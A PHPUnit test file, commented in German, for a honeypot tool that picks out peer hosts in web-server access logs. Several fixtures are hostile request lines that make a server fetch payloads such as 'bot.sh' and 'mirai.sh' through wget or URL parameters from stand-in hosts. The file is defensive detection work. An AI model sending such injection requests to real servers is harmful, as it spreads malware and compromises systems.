<?php
declare(strict_types=1);

/**
 * Tests der Gegenstellen-Erkennung.
 *
 * Die Beispiele stammen unverändert aus dem access.log von mfsvr.de. Erfundene Zeilen
 * würden genau die Fälle verfehlen, um die es hier geht – etwa die Chrome-Versionsnummer
 * 108.0.0.0, die syntaktisch eine gültige IP-Adresse ist.
 *
 * @author Kurt Ingwer
 * @version Letzte Änderung: 2026-09-23 09:30
 */

namespace Tests\Honeypot;

use Honeypot\LogEntry;
use Honeypot\PeerFinder;
use PHPUnit\Framework\TestCase;

final class PeerFinderTest extends TestCase
{
	private function entry(string $request, string $agent, string $ip = '10.200.0.1'): LogEntry
	{
		return LogEntry::fromLine(
			$ip . ' - - [21/Sep/2026:15:56:14 +0200] "' . $request . '" 404 172 "-" "' . $agent . '"'
		) ?? self::fail('Zeile nicht lesbar');
	}

	/** @return array<string, \Honeypot\Peer> */
	private function find(array $entries, array $ownNames = ['mfsvr.de']): array
	{
		$out = [];
		foreach ((new PeerFinder($ownNames))->find($entries) as $peer) {
			$out[$peer->host] = $peer;
		}
		return $out;
	}

	/**
	 * Der Normalfall auf diesem Server: Wer sich mit URL nennt, ist zuzuordnen – auch
	 * ohne Verbindungsadresse.
	 */
	public function testFindsOperatorsThatNameThemselvesInTheUserAgent(): void
	{
		$peers = $this->find([
			$this->entry('GET / HTTP/1.1', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'),
			$this->entry('GET / HTTP/1.1', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'),
			$this->entry('GET / HTTP/1.1', 'Mozilla/5.0 (compatible; CyberConvoyScout/1.0; +https://scout.cyberconvoy.co)'),
		]);
		self::assertSame(['about.censys.io', 'scout.cyberconvoy.co'], array_keys($peers));
		self::assertSame('Selbstauskunft', $peers['about.censys.io']->kind);
		self::assertSame(2, $peers['about.censys.io']->requests);
	}

	/**
	 * Der Fehler, der ohne echte Daten sicher passiert wäre: "Chrome/108.0.0.0" enthält
	 * eine syntaktisch gültige IP-Adresse. Aus Kennungen dürfen deshalb nur Namen aus
	 * URLs gelesen werden, nie nackte Zahlenfolgen.
	 */
	public function testDoesNotMistakeAVersionNumberForAnAddress(): void
	{
		$peers = $this->find([
			$this->entry('GET / HTTP/1.1', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/108.0.0.0 Safari/537.36'),
		]);
		self::assertSame([], $peers);
	}

	/**
	 * Wer einen offenen Proxy sucht, verrät sein Ziel. Das ist keine Herkunft, aber die
	 * einzige Absichtserklärung, die eine solche Anfrage mitbringt.
	 */
	public function testFindsTheTargetOfAProxyAttempt(): void
	{
		$peers = $this->find([$this->entry('CONNECT ip.ifconfig.dpdns.org:443 HTTP/1.1', '-')]);
		self::assertSame('Proxy-Ziel', $peers['ip.ifconfig.dpdns.org']->kind);
	}

	/**
	 * Ein Exploit-Versuch, der etwas nachlädt, nennt die Adresse seines Ablageservers –
	 * der interessanteste Fund, den ein Honigtopf machen kann.
	 */
	public function testFindsAddressesThatARequestWantsToLoadFrom(): void
	{
		$peers = $this->find([
			$this->entry('GET /cgi-bin/x?wget%20http://203.0.113.9/bot.sh HTTP/1.1', '-'),
			$this->entry('GET /?url=http://evil.example/payload HTTP/1.1', '-'),
		]);
		self::assertSame('Nachgeladen', $peers['203.0.113.9']->kind);
		self::assertSame('Nachgeladen', $peers['evil.example']->kind);
	}

	/**
	 * Solche Adressen kommen fast immer prozentkodiert an; ungeprüft bliebe genau der
	 * interessanteste Fund unsichtbar.
	 */
	public function testAlsoReadsAPercentEncodedAddress(): void
	{
		$peers = $this->find([
			$this->entry('GET /x?u=http%3A%2F%2F198.51.100.8%2Fmirai.sh HTTP/1.1', '-'),
		]);
		self::assertSame('Nachgeladen', $peers['198.51.100.8']->kind);
	}

	/**
	 * Sobald echte Verbindungsadressen im Log stehen, sind sie die beste Quelle. Solange
	 * eine Adressumsetzung davorsitzt, stehen dort nur private Adressen – die sagen
	 * nichts und dürfen keine Herkunft vortäuschen.
	 */
	public function testUsesTheConnectingAddressOnlyWhenItIsAPublicOne(): void
	{
		$private = $this->find([$this->entry('GET / HTTP/1.1', '-', '10.200.0.1')]);
		self::assertSame([], $private, 'das NAT-Gateway ist keine Gegenstelle');

		$loopback = $this->find([$this->entry('GET / HTTP/1.1', '-', '127.0.0.1')]);
		self::assertSame([], $loopback);

		$real = $this->find([$this->entry('GET / HTTP/1.1', '-', '203.0.113.42')]);
		self::assertSame('Verbindung', $real['203.0.113.42']->kind);
		self::assertTrue($real['203.0.113.42']->isAddress());
	}

	/**
	 * Der Portscanner MGLNDD schreibt die Adresse des ZIELS in die Anfrage, also unsere
	 * eigene. Als Herkunft wäre das grob irreführend.
	 */
	public function testLeavesOutOurOwnNamesAndAddresses(): void
	{
		$peers = $this->find([
			$this->entry('MGLNDD_87.106.116.167_443', '-'),
			$this->entry('GET / HTTP/1.1', 'Mozilla/5.0 (+https://87.106.116.167/)'),
			$this->entry('GET / HTTP/1.1', 'Irgendwas (+http://mfsvr.de/impressum)'),
		], ['mfsvr.de', 'www.mfsvr.de', '87.106.116.167']);
		self::assertSame([], $peers);
	}

	/**
	 * Eine Gegenstelle, die auf mehreren Wegen auftaucht, ist eine – sonst stünde
	 * dieselbe Stelle mehrfach mit geteilter Zahl in der Liste.
	 */
	public function testCountsTheSamePeerOnceAcrossAllSources(): void
	{
		$peers = $this->find([
			$this->entry('GET / HTTP/1.1', 'Bot (+https://evil.example/info)'),
			$this->entry('GET /?u=http://evil.example/x HTTP/1.1', '-'),
		]);
		self::assertCount(1, $peers);
		self::assertSame(2, $peers['evil.example']->requests);
	}

	public function testSortsTheBusiestPeerFirst(): void
	{
		$entries = [$this->entry('GET / HTTP/1.1', 'A (+https://selten.example/)')];
		for ($i = 0; $i < 3; $i++) {
			$entries[] = $this->entry('GET / HTTP/1.1', 'B (+https://oft.example/)');
		}
		self::assertSame(['oft.example', 'selten.example'], array_keys($this->find($entries)));
	}
}
